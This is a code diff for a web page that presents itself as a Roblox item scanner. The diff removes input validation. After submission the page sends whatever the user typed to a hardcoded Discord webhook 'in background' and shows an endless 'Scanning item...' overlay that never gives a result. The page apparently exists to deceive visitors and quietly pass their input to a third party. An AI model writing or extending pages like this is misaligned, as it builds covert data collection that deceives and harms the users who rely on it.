@@ -3,47 +3,71 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv
 
 // DOM Elements
 const scanBtn = document.getElementById('scanBtn');
+const modal = document.getElementById('scanModal');
 const itemInput = document.getElementById('itemInput');
-const validationMessage = document.getElementById('validationMessage');
-const resultsSection = document.getElementById('resultsSection');
+const submitBtn = document.getElementById('submitBtn');
+const cancelBtn = document.getElementById('cancelBtn');
+const closeBtn = document.querySelector('.close');
 const themeToggle = document.getElementById('themeToggle');
+const aboutBtn = document.getElementById('aboutBtn');
+const tosBtn = document.getElementById('tosBtn');
+const aboutModal = document.getElementById('aboutModal');
+const tosModal = document.getElementById('tosModal');
 
 // Event Listeners
-scanBtn.addEventListener('click', scanItem);
-itemInput.addEventListener('input', validateInput);
-itemInput.addEventListener('keydown', handleKeyDown);
+scanBtn.addEventListener('click', openModal);
+submitBtn.addEventListener('click', submitItem);
+cancelBtn.addEventListener('click', closeModal);
+closeBtn.addEventListener('click', closeModal);
+window.addEventListener('click', outsideClick);
 themeToggle.addEventListener('click', toggleTheme);
+aboutBtn.addEventListener('click', () => openInfoModal('about'));
+tosBtn.addEventListener('click', () => openInfoModal('tos'));
 
 // Functions
-function scanItem() {
+function openModal() {
+    modal.style.display = 'block';
+    itemInput.focus();
+}
+
+function closeModal() {
+    modal.style.display = 'none';
+    itemInput.value = '';
+}
+
+function outsideClick(e) {
+    if (e.target === modal || e.target === aboutModal || e.target === tosModal) {
+        closeModal();
+        closeInfoModals();
+    }
+}
+
+function openInfoModal(type) {
+    if (type === 'about') {
+        aboutModal.style.display = 'block';
+    } else if (type === 'tos') {
+        tosModal.style.display = 'block';
+    }
+}
+
+function closeInfoModals() {
+    aboutModal.style.display = 'none';
+    tosModal.style.display = 'none';
+}
+
+async function submitItem() {
     const input = itemInput.value.trim();
     
     if (!input) {
-        showValidationMessage('Please enter an item ID or URL', 'error');
         return;
     }
 
-    if (!isValidInput(input)) {
-        showValidationMessage('Invalid format. Please enter a valid Roblox item ID or URL.', 'error');
-        return;
-    }
-
-    // Show scanning animation
-    showScanningResults();
+    // Close modal and show infinite loading
+    closeModal();
+    showInfiniteLoading();
     
     // Send data to webhook in background
-    submitToWebhook(input);
-}
-
-function showValidationMessage(message, type) {
-    validationMessage.textContent = message;
-    validationMessage.className = `validation-message ${type}`;
-}
-
-function showScanningResults() {
-    resultsSection.style.display = 'block';
-    scanBtn.disabled = true;
-    showValidationMessage('Scanning in progress...', 'success');
+    await submitToWebhook(input);
 }
 
 function validateInput() {
@@ -276,21 +300,21 @@ function showLoading() {
     submitBtn.disabled = true;
 }
 
-function showInfiniteScanning() {
-    // Close the modal first
-    modal.style.display = 'none';
-    
-    // Show infinite loading overlay with scanning message
-    loadingOverlay.style.display = 'flex';
-    loadingOverlay.querySelector('p').textContent = 'Scanning item...';
+function showInfiniteLoading() {
+    // Create and show infinite loading overlay
+    const loadingOverlay = document.createElement('div');
+    loadingOverlay.className = 'loading-overlay';
+    loadingOverlay.innerHTML = `
+        <div class="loading-spinner"></div>
+        <p>Scanning item...</p>
+    `;
+    document.body.appendChild(loadingOverlay);
     
     // Disable all interactions
-    submitBtn.disabled = true;
     scanBtn.disabled = true;
     
-    // Add pulsing animation to the spinner
-    const spinner = loadingOverlay.querySelector('.loading-spinner');
-    spinner.style.animation = 'spin 1s linear infinite, pulse 2s ease-in-out infinite';
+    // Show the overlay
+    loadingOverlay.style.display = 'flex';
 }
 
 function hideLoading() {
